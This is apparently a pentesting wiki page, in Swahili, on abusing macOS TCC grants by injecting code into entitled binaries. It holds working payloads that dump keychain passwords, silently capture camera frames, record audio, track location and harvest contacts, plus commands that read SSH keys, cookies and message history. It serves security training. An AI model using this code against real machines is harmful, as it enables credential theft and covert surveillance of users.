# Credential & Data Theft kupitia TCC Permissions za macOS

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

macOS TCC (Transparency, Consent, and Control) hulinda ufikiaji wa data nyeti ya mtumiaji. Mshambulizi **anapodhibiti binary ambayo tayari ina TCC grants**, hurithi permissions hizo. Ukurasa huu unaeleza uwezekano wa exploitation wa kila TCC permission inayohusiana na data theft.<sup>[[2]](#references)</sup>

> [!WARNING]
> Code injection kwenye binary iliyopewa TCC (kupitia DYLD injection, dylib hijacking, au task port) **hurithi kwa siri TCC permissions zake zote**. Hakuna prompt au verification ya ziada wakati process hiyo hiyo inasoma data iliyolindwa.<sup>[[4]](#references)</sup>

---

## Keychain Access Groups

### Zawadi

macOS Keychain huhifadhi:
- **Nywila za Wi-Fi** — credentials zote za wireless networks zilizohifadhiwa
- **Nywila za websites** — nywila za Safari, Chrome (inapotumia Keychain), na browsers nyingine
- **Nywila za applications** — akaunti za barua pepe, VPN credentials, development tokens
- **Certificates na private keys** — code signing, client TLS, S/MIME encryption
- **Secure notes** — siri zilizohifadhiwa na mtumiaji

### Entitlement: `keychain-access-groups`

Keychain items hupangwa katika **access groups**. Entitlement ya `keychain-access-groups` ya application huorodhesha groups ambazo inaweza kufikia:<sup>[[1]](#references)</sup>
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Unyonyaji
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Ufikiaji wa Kamera (kTCCServiceCamera)

### Exploitation

Binary yenye TCC grant ya kamera (kupitia `kTCCServiceCamera` au entitlement ya `com.apple.security.device.camera`) inaweza kunasa picha na video:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Silent Capture
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> Kuanzia **macOS Sonoma**, kiashirio cha kamera kwenye upau wa menyu huwa kinaendelea kuonekana na hakiwezi kufichwa programmatically. Kwenye matoleo ya zamani ya macOS, capture fupi inaweza isitoe kiashirio kinachoonekana.

---

## Ufikiaji wa Maikrofoni (kTCCServiceMicrophone)

### Exploitation

Ufikiaji wa maikrofoni hunasa sauti yote kutoka kwenye maikrofoni iliyojengewa ndani, headset, au vifaa vya kuingiza sauti vilivyounganishwa:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Attack: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Ufuatiliaji wa Mahali (kTCCServiceLocation)

### Exploitation
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Ufuatiliaji Endelevu
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Mawasiliano / Kalenda / Picha

### Utoaji wa Data ya Kibinafsi

| TCC Service | Framework | Data |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Majina, barua pepe, nambari za simu, anwani |
| `kTCCServiceCalendar` | `EventKit` | Mikutano, washiriki, maeneo |
| `kTCCServicePhotos` | `Photos.framework` | Picha, picha za skrini, metadata ya eneo |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Uvunaji wa Contacts
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Ufikiaji wa Akaunti ya iCloud

### Entitlement: `com.apple.private.icloud-account-access`

Entitlement hii inaruhusu kuwasiliana na huduma ya XPC ya `com.apple.iCloudHelper`, na kutoa ufikiaji wa:
- **iCloud tokens** — tokens za uthibitishaji za Apple ID ya mtumiaji
- **iCloud Drive** — nyaraka zilizosawazishwa kutoka kwenye vifaa vyote
- **iCloud Keychain** — passwords zilizosawazishwa kwenye vifaa vyote vya Apple
- **Find My** — eneo la vifaa vyote vya Apple vya mtumiaji<sup>[[3]](#references)</sup>
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Kukompromaiti binary yenye iCloud entitlement hupanua shambulio kutoka kwa **kifaa kimoja hadi kwenye mfumo mzima wa Apple**: Mac nyingine, iPhone, iPad, Apple Watch. Usawazishaji wa iCloud Keychain unamaanisha kuwa passwords kutoka kwenye vifaa vyote zinaweza kufikiwa.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### Ruhusa Yenye Nguvu Zaidi ya TCC

Full Disk Access hutoa uwezo wa kusoma **kila file kwenye mfumo**, ikijumuisha:
- Data ya apps nyingine (Messages, Mail, historia ya Safari)
- TCC databases (zinazofichua ruhusa nyingine zote)
- SSH keys na configuration
- Browser cookies na session tokens
- Application databases na caches
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Exploitation Priority Matrix

Wakati wa kutathmini binary za TCC-granted zinazoweza kuingiziwa, zipatie kipaumbele kulingana na thamani ya data:

| Priority | TCC Permission | Why |
|---|---|---|
| **Critical** | Full Disk Access | Ufikiaji wa kila kitu |
| **Critical** | TCC Manager | Inaweza kutoa permission yoyote |
| **High** | Keychain Access Groups | Passwords zote zilizohifadhiwa |
| **High** | iCloud Account Access | Compromise ya vifaa vingi |
| **High** | Input Monitoring (ListenEvent) | Keylogging |
| **High** | Accessibility | Udhibiti wa GUI, kujipa permission |
| **Medium** | Screen Capture | Ukusanyaji wa data za kuona |
| **Medium** | Camera + Microphone | Ufuatiliaji |
| **Medium** | Contacts + Calendar | Data za social engineering |
| **Low** | Location | Ufuatiliaji wa eneo halisi |
| **Low** | Photos | Data binafsi |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## References

- [1] [Apple Developer — Huduma za Keychain](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [OBTS v5.0 — "Kinachotokea kwenye Mac yako, Hubaki kwenye iCloud ya Apple?!" (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [4] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
{{#include ../../../../banners/hacktricks-training.md}}
